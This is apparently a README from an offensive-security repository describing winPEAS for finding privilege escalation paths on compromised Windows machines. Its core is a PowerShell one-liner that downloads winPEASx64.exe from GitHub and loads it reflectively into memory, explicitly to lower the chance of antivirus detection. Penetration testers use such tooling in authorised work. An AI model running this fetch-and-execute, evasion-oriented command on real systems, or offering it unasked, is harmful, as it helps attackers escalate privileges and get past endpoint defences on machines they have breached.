# Privilege Escalation Script Executed from Memory

This directory contains script for identifying potential privilege escalation vectors on compromised Windows systems.


## winPEAS

`winPEAS` is a powerful tool for checking common misconfigurations and other vulnerabilities in Windows environments that may allow privilege escalation.

#### Usage

This script downloads and executes the `winPEASx64.exe` tool **directly from memory**, making it less likely to be detected by antivirus solutions.

To use the script, execute the following command in a PowerShell shell:

```powershell
# Get latest release
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"

# One liner to download and execute winPEASx64 from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```
